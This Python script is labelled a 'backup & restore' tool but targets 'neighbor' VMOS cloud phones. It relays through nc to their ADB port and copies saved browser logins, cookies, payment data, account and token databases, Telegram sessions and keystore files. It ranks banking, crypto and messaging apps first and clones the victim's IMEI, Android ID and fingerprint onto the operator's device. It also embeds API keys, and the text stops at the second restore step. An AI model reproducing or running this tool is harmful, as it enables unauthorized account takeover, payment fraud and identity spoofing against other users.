#!/usr/bin/env python3
"""
Device Backup & Restore v2.0
=============================
Complete neighbor device backup and restore system using VMOS Cloud API.

Key improvements over device_cloner.py v1:
  - Restore uses Cloud API syncCmd (runs as ROOT) — no ADB root needed
  - Correct switchRoot body format: rootEnable (not rootStatus/rootType)
  - Device fingerprint backup/restore via padProperties/updatePadProperties
  - uploadFileV3 with targetPath for direct file injection
  - Comprehensive data: Chrome, GMS, tapandpay, COIN.xml, WiFi, accounts
  - Proper permission fixing via syncCmd root shell

Architecture:
  BACKUP:  Local → SSH tunnel → ADB bridge → nc relay → Neighbor ADB (root)
  RESTORE: Local → Cloud API syncCmd (root) + ADB bridge push to /data/local/tmp/

Usage:
  python3 scanning/device_backup_restore.py backup <TARGET_IP>
  python3 scanning/device_backup_restore.py restore <TARGET_IP>
  python3 scanning/device_backup_restore.py full <TARGET_IP>         # backup + restore
  python3 scanning/device_backup_restore.py fingerprint <TARGET_IP>  # properties only
  python3 scanning/device_backup_restore.py status                   # check device status
"""

import asyncio
import subprocess
import os
import sys
import json
import time
import sqlite3
from pathlib import Path
from typing import Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ═══════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
OUR_PAD = "AC32010810392"
RELAY_PORT = 15573
ADB_BRIDGE = "localhost:8550"
CLONE_ROOT = "tmp/device_clones"
API_RATE_DELAY = 3.5  # seconds between API calls

# Package classification
CRITICAL_PKGS = [
    "com.google.android.gms",
    "com.google.android.gsf",       # Google Services Framework — stores Android ID, device token
    "com.google.android.gms.policy_sidecar_aps",
    "com.android.chrome",
    "com.android.vending",
]

HIGH_PRIORITY_RE = [
    "revolut", "paypal", "venmo", "cashapp", "wise", "transferwise",
    "maya", "gcash", "coinbase", "binance", "metamask", "trust",
    "wallet", "bank", "crypto", "pay", "money", "cash",
    "whatsapp", "telegram", "instagram", "facebook", "tiktok",
    "airbnb", "uber", "grab",
]

SYSTEM_SKIP = [
    "com.android.", "android.", "com.google.android.ext.",
    "com.google.android.networkstack", "com.google.android.cellbroadcast",
    "com.google.android.captiveportallogin", "com.google.android.documentsui",
    "com.google.android.feedback", "com.google.android.gsf",
    "com.google.android.inputmethod", "com.google.android.onetimeinitializer",
    "com.google.android.packageinstaller", "com.google.android.permissioncontroller",
    "com.google.android.printservice", "com.google.android.providers",
    "com.google.android.setupwizard", "com.google.android.tts",
    "com.google.android.webview",
    "com.cloud.", "com.owlproxy.", "com.vmos.",
]

# Identity properties to clone between devices
IDENTITY_PROPS = [
    "ro.product.brand", "ro.product.model", "ro.product.device",
    "ro.product.name", "ro.product.manufacturer",
    "ro.build.display.id", "ro.build.version.release",
    "ro.build.version.sdk", "ro.build.fingerprint",
    "ro.product.board", "ro.hardware",
    "ro.serialno", "ro.boot.serialno",
    "ro.build.version.incremental", "ro.build.flavor",
    "ro.odm.build.fingerprint", "ro.vendor.build.fingerprint",
    "ro.system.build.fingerprint", "ro.system_ext.build.fingerprint",
    "ro.product.build.fingerprint",
]

# Cloud-specific identity properties (persist.sys.cloud.*)
CLOUD_IDENTITY_PROPS = [
    "persist.sys.cloud.imeinum", "persist.sys.cloud.iccidnum",
    "persist.sys.cloud.imsinum", "persist.sys.cloud.drm.id",
    "persist.sys.cloud.drm.puid", "ro.sys.cloud.android_id",
    "persist.sys.cloud.wifi.ssid", "persist.sys.cloud.wifi.mac",
    "persist.sys.cloud.wifi.ip", "persist.sys.cloud.wifi.gateway",
    "persist.sys.cloud.wifi.dns1",
    "persist.sys.cloud.gpu.gl_vendor", "persist.sys.cloud.gpu.gl_renderer",
    "persist.sys.cloud.gpu.gl_version",
    "persist.sys.cloud.gps.lat", "persist.sys.cloud.gps.lon",
    "persist.sys.cloud.phonenum", "persist.sys.cloud.mobileinfo",
    "persist.sys.cloud.cellinfo",
    "persist.sys.cloud.battery.capacity", "persist.sys.cloud.battery.level",
    "persist.sys.cloud.boottime.offset",
    "persist.sys.cloud.pm.install_source",
]

# ═══════════════════════════════════════════════════════════════════════
# ADB HELPERS
# ═══════════════════════════════════════════════════════════════════════

def adb(addr, cmd, timeout=15):
    """Execute ADB shell command."""
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "shell", cmd],
            capture_output=True, text=True, timeout=timeout
        )
        return r.stdout.strip()
    except (subprocess.TimeoutExpired, Exception):
        return ""

def adb_pull(addr, remote, local, timeout=120):
    """Pull file from device via ADB."""
    os.makedirs(os.path.dirname(local) or ".", exist_ok=True)
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "pull", remote, local],
            capture_output=True, text=True, timeout=timeout
        )
        return r.returncode == 0
    except Exception:
        return False

def adb_push(addr, local, remote, timeout=300):
    """Push file to device via ADB. Reconnects once if connection was dropped."""
    for attempt in range(2):
        try:
            r = subprocess.run(
                ["adb", "-s", addr, "push", local, remote],
                capture_output=True, text=True, timeout=timeout
            )
            if r.returncode == 0:
                return True
            # Reconnect and retry
            if attempt == 0:
                subprocess.run(["adb", "connect", addr], capture_output=True, timeout=8)
        except (subprocess.TimeoutExpired, Exception):
            if attempt == 0:
                subprocess.run(["adb", "connect", addr], capture_output=True, timeout=8)
    return False


def adb_check(addr):
    """Check ADB connectivity, reconnect if needed. Returns True if alive."""
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "shell", "echo OK"],
            capture_output=True, text=True, timeout=5
        )
        if "OK" in r.stdout:
            return True
    except Exception:
        pass
    # Try reconnect
    subprocess.run(["adb", "connect", addr], capture_output=True, timeout=8)
    try:
        r = subprocess.run(
            ["adb", "-s", addr, "shell", "echo OK"],
            capture_output=True, text=True, timeout=5
        )
        return "OK" in r.stdout
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════
# CLOUD API HELPERS (syncCmd = ROOT shell)
# ═══════════════════════════════════════════════════════════════════════

async def cloud_cmd(client, pad_code, command, timeout_sec=30):
    """Execute command via Cloud API syncCmd (runs as ROOT)."""
    try:
        result = await client.sync_cmd(pad_code, command, timeout_sec=timeout_sec)
        if not result or not isinstance(result, dict):
            return ""
        data = result.get("data", [])
        if data and isinstance(data, list) and len(data) > 0:
            return data[0].get("errorMsg", "") or ""
        return ""
    except Exception as e:
        print(f"    [!] Cloud cmd error: {e}")
        return ""

async def cloud_cmd_check(client, pad_code, command, timeout_sec=30):
    """Execute command via Cloud API and return (output, success)."""
    output = await cloud_cmd(client, pad_code, command, timeout_sec)
    return output


async def background_extract(client, pad_code, remote_tar, data_path, pkg):
    """Extract large tar in background via nohup + poll for marker file.
    
    syncCmd has a ~2s server-side timeout that kills tar extraction for
    archives >10MB.  We launch the tar as a detached background process
    and poll for a completion marker.
    """
    marker = f"/tmp/.extract_done_{pkg.replace('.', '_')}"
    # Clean old marker
    await cloud_cmd(client, pad_code, f"rm -f {marker}")
    await asyncio.sleep(API_RATE_DELAY)

    # Launch background extraction
    bg_cmd = (
        f"nohup sh -c '"
        f"mkdir -p {data_path} && "
        f"cd {data_path} && "
        f"tar xzf {remote_tar} 2>/dev/null && "
        f"echo OK > {marker}"
        f"' >/dev/null 2>&1 &"
    )
    await cloud_cmd(client, pad_code, bg_cmd, timeout_sec=10)
    await asyncio.sleep(API_RATE_DELAY)

    # Poll for marker (max 120s for very large archives)
    for i in range(40):
        await asyncio.sleep(3)  # 3s polling interval
        check = await cloud_cmd(client, pad_code, f"cat {marker} 2>/dev/null")
        if check and "OK" in check:
            await cloud_cmd(client, pad_code, f"rm -f {marker}")
            return True
        await asyncio.sleep(API_RATE_DELAY)

    return False


async def background_install_apk(client, pad_code, remote_apk, pkg):
    """Install APK in background via asyncCmd + poll for completion.
    
    pm install via syncCmd fails for large APKs due to server-side timeout.
    asyncCmd runs without timeout constraints.
    """
    marker = f"/tmp/.install_done_{pkg.replace('.', '_')}"
    await cloud_cmd(client, pad_code, f"rm -f {marker}")
    await asyncio.sleep(API_RATE_DELAY)

    # Use asyncCmd for background install
    try:
        result = await client.async_adb_cmd([pad_code],
            f"sh -c 'pm install -r -g -d {remote_apk} > {marker} 2>&1'")
        await asyncio.sleep(API_RATE_DELAY)
    except Exception as e:
        print(f"    [!] asyncCmd install error: {e}")
        return False

    # Poll for install completion (max 90s)
    for i in range(30):
        await asyncio.sleep(3)
        check = await cloud_cmd(client, pad_code, f"cat {marker} 2>/dev/null")
        if check and ("Success" in check or "INSTALL" in check or "Failure" in check):
            await cloud_cmd(client, pad_code, f"rm -f {marker}")
            return "Success" in check
        await asyncio.sleep(API_RATE_DELAY)

    return False


async def enable_root_api(client, pad_code):
    """Enable root via Cloud API with correct body format."""
    try:
        result = await client._post("/vcpcloud/api/padApi/switchRoot", {
            "padCodes": [pad_code],
            "rootEnable": True,
        })
        code = result.get("code", -1)
        if code == 0:
            print("  [+] Root enabled via API (rootEnable: true)")
            return True
        else:
            print(f"  [!] Root enable response: {result}")
            return False
    except Exception as e:
        print(f"  [!] Root enable error: {e}")
        return False


# ═══════════════════════════════════════════════════════════════════════
# RELAY MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════

async def deploy_relay(client, target_ip, port=RELAY_PORT):
    """Deploy nc relay to neighbor via Cloud API."""
    await cloud_cmd(client, OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; rm -f /data/local/tmp/rf_{port}; echo c",
    )
    await asyncio.sleep(0.4)

    output = await cloud_cmd(client, OUR_PAD,
        f"mkfifo /data/local/tmp/rf_{port} && echo fifo_ok",
    )
    if "fifo_ok" not in output:
        return False

    await asyncio.sleep(0.3)
    output = await cloud_cmd(client, OUR_PAD,
        f'nohup sh -c "nc -l -p {port} < /data/local/tmp/rf_{port} | '
        f'nc {target_ip} 5555 > /data/local/tmp/rf_{port}" > /dev/null 2>&1 & echo relay_ok',
    )
    return "relay_ok" in output

def connect_relay(port=RELAY_PORT):
    """Connect ADB to relay port."""
    addr = f"localhost:{port}"
    subprocess.run(["adb", "disconnect", addr], capture_output=True, timeout=5)
    subprocess.run(["adb", "-s", ADB_BRIDGE, "forward", f"tcp:{port}", f"tcp:{port}"],
                   capture_output=True, timeout=8)
    subprocess.run(["adb", "connect", addr], capture_output=True, timeout=8)
    return addr

async def kill_relay(client, port=RELAY_PORT):
    """Kill relay process."""
    await cloud_cmd(client, OUR_PAD,
        f"pkill -f 'nc.*{port}' 2>/dev/null; echo d",
    )


# ═══════════════════════════════════════════════════════════════════════
# PACKAGE CLASSIFICATION
# ═══════════════════════════════════════════════════════════════════════

def should_skip(pkg):
    return any(pkg.startswith(p) for p in SYSTEM_SKIP)

def is_high_priority(pkg):
    pkg_lower = pkg.lower()
    return any(kw in pkg_lower for kw in HIGH_PRIORITY_RE)

def classify_packages(pkgs):
    critical, high, normal = [], [], []
    for pkg in pkgs:
        if should_skip(pkg):
            continue
        if pkg in CRITICAL_PKGS:
            critical.append(pkg)
        elif is_high_priority(pkg):
            high.append(pkg)
        else:
            normal.append(pkg)
    return critical, high, normal


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: BACKUP (EXTRACT FROM NEIGHBOR)
# ═══════════════════════════════════════════════════════════════════════

async def backup_device(client, target_ip):
    """Full device backup from neighbor via relay."""
    clone_dir = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    os.makedirs(clone_dir, exist_ok=True)

    print(f"\n{'═'*70}")
    print(f"  DEVICE BACKUP & RESTORE v2.0 — BACKUP")
    print(f"  Target: {target_ip}")
    print(f"  Clone dir: {clone_dir}")
    print(f"{'═'*70}")

    # ── Deploy relay ──
    print(f"\n  [1/6] Deploying relay...")
    if not await deploy_relay(client, target_ip):
        print("  [!] Relay deploy FAILED")
        return None
    await asyncio.sleep(0.6)

    addr = connect_relay()
    await asyncio.sleep(0.5)

    test = adb(addr, "echo OK", 5)
    if "OK" not in test:
        print("  [!] ADB not responding via relay")
        return None

    # ── Device info ──
    whoami = adb(addr, "whoami")
    model = adb(addr, "getprop ro.product.model")
    brand = adb(addr, "getprop ro.product.brand")
    android_ver = adb(addr, "getprop ro.build.version.release")
    shell_id = adb(addr, "id")
    is_root = "uid=0" in shell_id

    print(f"  Device: {brand} {model}")
    print(f"  Android: {android_ver}")
    print(f"  Shell: {'ROOT' if is_root else 'SHELL'}")

    report = {
        "target_ip": target_ip,
        "brand": brand,
        "model": model,
        "android": android_ver,
        "is_root": is_root,
        "backup_version": "2.0",
        "backed_up_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "packages": {},
    }

    # ── [2/6] Backup device fingerprint ──
    print(f"\n  [2/6] Backing up device fingerprint...")
    props_raw = adb(addr, "getprop", 20)
    props_file = os.path.join(clone_dir, "build.prop")
    with open(props_file, "w") as f:
        f.write(props_raw)

    # Parse properties into structured format
    all_props = {}
    for line in props_raw.splitlines():
        line = line.strip()
        if line.startswith("[") and "]: [" in line:
            key = line.split("]: [")[0].lstrip("[")
            val = line.split("]: [")[1].rstrip("]")
            all_props[key] = val

    fingerprint = {k: all_props.get(k, "") for k in IDENTITY_PROPS + CLOUD_IDENTITY_PROPS if all_props.get(k)}
    fp_file = os.path.join(clone_dir, "fingerprint.json")
    with open(fp_file, "w") as f:
        json.dump(fingerprint, f, indent=2)
    print(f"    Fingerprint: {len(fingerprint)} properties saved")

    report["fingerprint_count"] = len(fingerprint)

    # ── [3/6] Enumerate and classify packages ──
    print(f"\n  [3/6] Enumerating packages...")
    raw = adb(addr, "pm list packages -3 2>/dev/null | cut -d: -f2", 15)
    all_3p = [p.strip() for p in raw.splitlines() if p.strip()]
    print(f"    Third-party packages: {len(all_3p)}")

    critical, high, normal = classify_packages(all_3p)

    # Ensure critical GMS always included
    for pkg in CRITICAL_PKGS:
        if pkg not in critical:
            critical.insert(0, pkg)

    extract_order = critical + high + normal
    print(f"    Extraction order: {len(critical)} critical + {len(high)} high-priority + {len(normal)} normal")

    # ── [4/6] Extract package data ──
    print(f"\n  [4/6] Extracting package data...")
    total = len(extract_order)
    t0 = time.time()

    for idx, pkg in enumerate(extract_order, 1):
        elapsed = time.time() - t0
        rate = elapsed / idx if idx > 1 else 0
        eta = rate * (total - idx)

        print(f"\n  [{idx:3d}/{total}] {pkg}", end="", flush=True)

        pkg_dir = os.path.join(clone_dir, "apps", pkg)
        os.makedirs(pkg_dir, exist_ok=True)
        pkg_report = {"status": "pending"}

        # Check if data exists
        data_path = f"/data/data/{pkg}"
        ls_test = adb(addr, f"ls {data_path}/ 2>/dev/null | head -1", 5)

        if not ls_test:
            print(f" → no data", end="")
            pkg_report["status"] = "no_data"
            report["packages"][pkg] = pkg_report
            continue

        # Get APK path
        apk_line = adb(addr, f"pm path {pkg} 2>/dev/null | head -1", 5)
        if apk_line and "package:" in apk_line:
            apk_remote = apk_line.replace("package:", "").strip()
            apk_local = os.path.join(pkg_dir, "base.apk")
            pull_ok = adb_pull(addr, apk_remote, apk_local, 120)
            # Verify by file size on disk — adb_pull return code can be wrong
            if pull_ok or (os.path.exists(apk_local) and os.path.getsize(apk_local) > 10240):
                sz = os.path.getsize(apk_local) / 1024 / 1024
                print(f" → APK {sz:.1f}M", end="", flush=True)
                pkg_report["apk"] = True
                pkg_report["apk_size_mb"] = round(sz, 1)
            else:
                print(f" → APK fail", end="", flush=True)
                pkg_report["apk"] = False

        # Create tar of app data
        tar_remote = f"/data/local/tmp/clone_{pkg.replace('.','_')}.tar.gz"
        tar_local = os.path.join(pkg_dir, "data.tar.gz")

        tar_result = adb(addr,
            f"cd {data_path} && tar czf {tar_remote} . 2>/dev/null && echo TAR_OK", 90)

        if "TAR_OK" in tar_result:
            if adb_pull(addr, tar_remote, tar_local, 180):
                sz = os.path.getsize(tar_local) / 1024
                print(f" data {sz:.0f}K", end="", flush=True)
                pkg_report["data_tar"] = True
                pkg_report["data_size_kb"] = round(sz, 1)
            else:
                print(f" pull-fail", end="", flush=True)
                pkg_report["data_tar"] = False
            adb(addr, f"rm -f {tar_remote}", 5)
        else:
            # Fallback: pull individual files
            pulled = 0
            for subdir in ["databases", "shared_prefs", "files"]:
                files = adb(addr, f"ls {data_path}/{subdir}/ 2>/dev/null", 5)
                if not files:
                    continue
                sub_local = os.path.join(pkg_dir, subdir)
                os.makedirs(sub_local, exist_ok=True)
                for f_name in files.splitlines():
                    f_name = f_name.strip()
                    if f_name and not f_name.endswith(("-wal", "-shm")):
                        if adb_pull(addr, f"{data_path}/{subdir}/{f_name}",
                                   os.path.join(sub_local, f_name), 30):
                            pulled += 1
            print(f" files={pulled}", end="", flush=True)
            pkg_report["individual_files"] = pulled

        # Get UID info for later restore
        uid_info = adb(addr, f"stat -c '%u:%g' {data_path} 2>/dev/null", 5)
        if uid_info and ":" in uid_info:
            pkg_report["original_uid"] = uid_info.split(":")[0]
            pkg_report["original_gid"] = uid_info.split(":")[1]

        pkg_report["status"] = "extracted"
        report["packages"][pkg] = pkg_report
        print(f" ✓", end="", flush=True)

    # ── [5/6] Device-level data ──
    print(f"\n\n  [5/6] Device-level extractions...")

    # Accounts dump
    accts = adb(addr, "dumpsys account 2>/dev/null", 20)
    with open(os.path.join(clone_dir, "accounts_dump.txt"), "w") as f:
        f.write(accts)

    accounts = []
    for line in accts.splitlines():
        if "Account {" in line and "name=" in line:
            try:
                name = line.split("name=")[1].split(",")[0]
                atype = line.split("type=")[1].rstrip("}").strip()
                accounts.append({"name": name, "type": atype})
            except (IndexError, ValueError):
                pass
    report["accounts"] = accounts
    print(f"    Accounts: {len(accounts)}")

    # Package list with paths
    pl = adb(addr, "pm list packages -f 2>/dev/null", 15)
    with open(os.path.join(clone_dir, "packages.txt"), "w") as f:
        f.write(pl)

    # WiFi config
    wifi = adb(addr, "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null", 10)
    if wifi:
        with open(os.path.join(clone_dir, "WifiConfigStore.xml"), "w") as f:
            f.write(wifi)
        print(f"    WiFi config: ✓")

    # Chrome special extraction
    print(f"\n    Chrome data:")
    chrome_dir = os.path.join(clone_dir, "chrome_data")
    os.makedirs(chrome_dir, exist_ok=True)
    for db_name in ["Login Data", "Web Data", "Cookies", "History"]:
        remote = f'/data/data/com.android.chrome/app_chrome/Default/{db_name}'
        local = os.path.join(chrome_dir, db_name.replace(" ", "_") + ".db")
        if adb_pull(addr, remote, local, 30):
            print(f"      {db_name}: ✓")
            if "Login" in db_name:
                try:
                    conn = sqlite3.connect(local)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value FROM logins LIMIT 20")
                    logins = cur.fetchall()
                    report["chrome_logins"] = [{"url": r[0], "user": r[1]} for r in logins]
                    print(f"      Saved logins: {len(logins)}")
                    conn.close()
                except Exception as e:
                    print(f"      DB error: {e}")

    # TapAndPay
    tap_local = os.path.join(clone_dir, "tapandpay.db")
    if adb_pull(addr, "/data/data/com.google.android.gms/databases/tapandpay.db", tap_local, 30):
        print(f"    tapandpay.db: ✓")
    else:
        print(f"    tapandpay.db: not found")

    # COIN.xml
    coin = adb(addr, "cat /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null", 10)
    if coin:
        with open(os.path.join(clone_dir, "COIN.xml"), "w") as f:
            f.write(coin)
        print(f"    COIN.xml: ✓")

    # ── System accounts.db (Android AccountManager — all SSO tokens) ──
    print(f"\n    System accounts DB:")
    gms_accts = os.path.join(clone_dir, "gms_accounts")
    os.makedirs(gms_accts, exist_ok=True)
    # Correct paths: accounts.db lives in system_ce/0/ (CE = credential-encrypted)
    # and system_de/0/ (DE = device-encrypted). NOT named accounts_ce.db.
    acct_paths = [
        "/data/system_ce/0/accounts.db",
        "/data/system_de/0/accounts.db",
        "/data/system/users/0/accounts.db",
        "/data/system/accounts.db",
        "/data/system_ce/0/accounts_ce.db",
        "/data/system_de/0/accounts_de.db",
    ]
    for base_path in acct_paths:
        fname = base_path.replace("/", "_").lstrip("_")
        local_path = os.path.join(gms_accts, fname)
        if adb_pull(addr, base_path, local_path, 15):
            sz = os.path.getsize(local_path) if os.path.exists(local_path) else 0
            if sz > 0:
                print(f"      {base_path}: ✓ ({sz} bytes)")
            else:
                os.remove(local_path)  # Remove empty files

    pulled_accts = [f for f in os.listdir(gms_accts) if os.path.getsize(os.path.join(gms_accts, f)) > 0]
    print(f"      Total account DBs: {len(pulled_accts)}")

    # ── Full GMS shared_prefs (auth tokens, Gservices, phenotype config) ──
    print(f"\n    GMS shared_prefs (auth tokens):")
    gms_prefs_dir = os.path.join(clone_dir, "gms_shared_prefs")
    os.makedirs(gms_prefs_dir, exist_ok=True)
    gms_prefs_list = adb(addr, "ls /data/data/com.google.android.gms/shared_prefs/ 2>/dev/null", 10)
    gms_prefs_pulled = 0
    for pref_file in gms_prefs_list.splitlines():
        pref_file = pref_file.strip()
        if pref_file:
            if adb_pull(addr,
                        f"/data/data/com.google.android.gms/shared_prefs/{pref_file}",
                        os.path.join(gms_prefs_dir, pref_file), 10):
                gms_prefs_pulled += 1
    print(f"      Pulled {gms_prefs_pulled} GMS prefs files")

    # ── Full GMS databases (googleapis.db, phenotype.db, etc.) ──
    print(f"    GMS databases:")
    gms_db_dir = os.path.join(clone_dir, "gms_databases")
    os.makedirs(gms_db_dir, exist_ok=True)
    gms_db_list = adb(addr, "ls /data/data/com.google.android.gms/databases/ 2>/dev/null", 10)
    gms_db_pulled = 0
    for db_file in gms_db_list.splitlines():
        db_file = db_file.strip()
        if db_file and not db_file.endswith(("-wal", "-shm", "-journal")):
            if adb_pull(addr,
                        f"/data/data/com.google.android.gms/databases/{db_file}",
                        os.path.join(gms_db_dir, db_file), 30):
                gms_db_pulled += 1
    print(f"      Pulled {gms_db_pulled} GMS database files")

    # ── Google Services Framework (Android ID, device registration) ──
    print(f"    Google Services Framework:")
    gsf_dir = os.path.join(clone_dir, "gsf_data")
    os.makedirs(gsf_dir, exist_ok=True)
    gsf_dbs = adb(addr, "ls /data/data/com.google.android.gsf/databases/ 2>/dev/null", 5)
    for gsf_db in gsf_dbs.splitlines():
        gsf_db = gsf_db.strip()
        if gsf_db and not gsf_db.endswith(("-wal", "-shm")):
            if adb_pull(addr, f"/data/data/com.google.android.gsf/databases/{gsf_db}",
                        os.path.join(gsf_dir, gsf_db), 15):
                print(f"      {gsf_db}: ✓")
    gsf_prefs = adb(addr, "ls /data/data/com.google.android.gsf/shared_prefs/ 2>/dev/null", 5)
    for gsf_pref in gsf_prefs.splitlines():
        gsf_pref = gsf_pref.strip()
        if gsf_pref:
            adb_pull(addr, f"/data/data/com.google.android.gsf/shared_prefs/{gsf_pref}",
                     os.path.join(gsf_dir, gsf_pref), 10)

    # ── Telegram explicit session files ──
    print(f"    Telegram session files:")
    tg_session_dir = os.path.join(clone_dir, "telegram_session")
    os.makedirs(tg_session_dir, exist_ok=True)
    for tg_pkg in ["org.telegram.messenger.web", "org.telegram.messenger"]:
        tg_base = f"/data/data/{tg_pkg}/files"
        for tg_file in ["tgnet.dat", "cache4.db", "dc2conf.dat", "stats2.dat"]:
            local = os.path.join(tg_session_dir, tg_file)
            if adb_pull(addr, f"{tg_base}/{tg_file}", local, 30):
                print(f"      {tg_file}: ✓")
                break
        # Multi-account dirs
        for acct_num in range(1, 4):
            acct_dir = os.path.join(tg_session_dir, f"account{acct_num}")
            os.makedirs(acct_dir, exist_ok=True)
            for tg_file in ["tgnet.dat", "cache4.db", "dc2conf.dat"]:
                local = os.path.join(acct_dir, tg_file)
                if adb_pull(addr, f"{tg_base}/account{acct_num}/{tg_file}", local, 30):
                    break
        if adb(addr, f"ls {tg_base}/tgnet.dat 2>/dev/null", 3):
            break  # Found the right package

    # ── Keystore (payment keys, auth keys — root required) ──
    print(f"    Keystore:")
    ks_dir = os.path.join(clone_dir, "keystore")
    os.makedirs(ks_dir, exist_ok=True)
    ks_list = adb(addr, "ls /data/misc/keystore/user_0/ 2>/dev/null | head -30", 5)
    ks_pulled = 0
    for ks_file in ks_list.splitlines():
        ks_file = ks_file.strip()
        if ks_file and is_root:
            if adb_pull(addr, f"/data/misc/keystore/user_0/{ks_file}",
                        os.path.join(ks_dir, ks_file), 10):
                ks_pulled += 1
    print(f"      Keystore entries: {ks_pulled} ({'root' if is_root else 'no root — skipped'})")

    # ── [6/6] Save report ──
    print(f"\n  [6/6] Saving report...")
    report["status"] = "backed_up"
    report_file = os.path.join(clone_dir, "clone_report.json")
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2, default=str)

    # Stats
    extracted = sum(1 for p in report["packages"].values() if p["status"] == "extracted")
    total_apk = sum(p.get("apk_size_mb", 0) for p in report["packages"].values())
    total_data = sum(p.get("data_size_kb", 0) for p in report["packages"].values()) / 1024

    # Cleanup
    subprocess.run(["adb", "disconnect", f"localhost:{RELAY_PORT}"], capture_output=True, timeout=5)
    await kill_relay(client)

    print(f"\n{'═'*70}")
    print(f"  BACKUP COMPLETE")
    print(f"  Packages: {extracted}/{total}")
    print(f"  APK size: {total_apk:.1f} MB")
    print(f"  Data size: {total_data:.1f} MB")
    print(f"  Accounts: {len(accounts)}")
    print(f"  Clone dir: {clone_dir}")
    print(f"{'═'*70}")

    return report


# ═══════════════════════════════════════════════════════════════════════
# PHASE 2: RESTORE TO OUR DEVICE (Cloud API syncCmd = ROOT)
# ═══════════════════════════════════════════════════════════════════════

async def restore_device(client, target_ip):
    """
    Restore cloned device data to our device.
    
    KEY DIFFERENCE from v1: Uses Cloud API syncCmd for ALL root operations.
    syncCmd runs as ROOT on the device — no ADB root needed.
    ADB bridge is only used for file push to /data/local/tmp/ (no root needed).
    """
    clone_dir = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))
    report_file = os.path.join(clone_dir, "clone_report.json")

    if not os.path.exists(report_file):
        print(f"[!] No backup report at {report_file}")
        print(f"    Run backup first: python3 scanning/device_backup_restore.py backup {target_ip}")
        return None

    with open(report_file) as f:
        report = json.load(f)

    print(f"\n{'═'*70}")
    print(f"  DEVICE BACKUP & RESTORE v2.0 — RESTORE TO {OUR_PAD}")
    print(f"  Source: {target_ip} ({report.get('brand','')} {report.get('model','')})")
    print(f"  Packages: {len(report.get('packages', {}))}")
    print(f"  Method: Cloud API syncCmd (ROOT) + ADB push")
    print(f"{'═'*70}")

    # ── Verify our device is accessible ──
    print(f"\n  [0] Verifying device access...")

    # Test Cloud API syncCmd (this is our ROOT channel)
    api_test = await cloud_cmd(client, OUR_PAD, "echo CLOUD_ROOT_OK && id")
    await asyncio.sleep(API_RATE_DELAY)

    if "CLOUD_ROOT_OK" in api_test:
        print(f"  [+] Cloud API syncCmd: WORKING")
        if "uid=0" in api_test:
            print(f"  [+] Cloud shell: ROOT confirmed")
        else:
            print(f"  [*] Cloud shell: {api_test}")
    else:
        print(f"  [!] Cloud API syncCmd not responding: {api_test}")
        print(f"  [!] Trying to enable root...")
        await enable_root_api(client, OUR_PAD)
        await asyncio.sleep(5)
        api_test = await cloud_cmd(client, OUR_PAD, "echo READY && id")
        if "READY" not in api_test:
            print(f"  [!] Device not accessible via Cloud API. Aborting.")
            return None

    # Test ADB bridge (for file push only — no root needed)
    adb_available = adb_check(ADB_BRIDGE)
    if adb_available:
        print(f"  [+] ADB bridge: AVAILABLE (for file push)")
    else:
        print(f"  [*] ADB bridge: UNAVAILABLE — will use base64 via syncCmd")

    restore_log = {
        "source": target_ip,
        "target": OUR_PAD,
        "restore_version": "2.0",
        "method": "cloud_api_syncmd_root",
        "started": time.strftime("%Y-%m-%d %H:%M:%S"),
        "apps": {},
    }

    # ═══════════════════════════════════════════════════════════════════
    # STEP 1: Restore device fingerprint (properties)
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n  [1/5] Restoring device fingerprint...")

    fp_file = os.path.join(clone_dir, "fingerprint.json")
    props_file = os.path.join(clone_dir, "build.prop")

    if os.path.exists(fp_file):
        with open(fp_file) as f:
            fingerprint = json.load(f)
    elif os.path.exists(props_file):
        # Parse from build.prop
        fingerprint = {}
        with open(props_file) as f:
            for line in f:
                line = line.strip()
                if line.startswith("[") and "]: [" in line:
                    key = line.split("]: [")[0].lstrip("[")
                    val = line.split("]: [")[1].rstrip("]")
                    if key in IDENTITY_PROPS + CLOUD_IDENTITY_PROPS and val:
                        fingerprint[key] = val
    else:
        fingerprint = {}

    if fingerprint:
        # Split into runtime props (persist.*) and identity props (ro.*)
        runtime_props = {k: v for k, v in fingerprint.items()
                        if k.startswith("persist.") or k.startswith("ro.sys.cloud")}
        identity_props = {k: v for k, v in fingerprint.items()
                         if k.startswith("ro.") and not k.startswith("ro.sys.cloud")}

        # Apply runtime props via updatePadProperties (no restart)
        if runtime_props:
            try:
                await client.modify_instance_properties([OUR_PAD], runtime_props)
                print(f"    Runtime properties: {len(runtime_props)} applied (no restart)")
                await asyncio.sleep(API_RATE_DELAY)
            except Exception as e:
                print(f"    Runtime props error: {e}")

        # Apply identity props via syncCmd resetprop (no restart needed)
        if identity_props:
            prop_cmds = []
            for k, v in identity_props.items():
                # Use resetprop for ro.* properties if available
                prop_cmds.append(f'resetprop {k} "{v}" 2>/dev/null || setprop {k} "{v}" 2>/dev/null')

            # Batch in groups of 5 to stay within command length limits
            for i in range(0, len(prop_cmds), 5):
                batch = " && ".join(prop_cmds[i:i+5])
                await cloud_cmd(client, OUR_PAD, batch + " && echo PROPS_OK", timeout_sec=15)
                await asyncio.sleep(API_RATE_DELAY)

            print(f"    Identity properties: {len(identity_props)} applied via resetprop")

        restore_log["fingerprint"] = {
            "runtime_props": len(runtime_props),
            "identity_props": len(identity_props),
        }
    else:
        print(f"    No fingerprint data found")

    # ═══════════════════════════════════════════════════════════════════
    # STEP 2: Restore app data
    # ═══════════════════════════════════════════════════════════════════
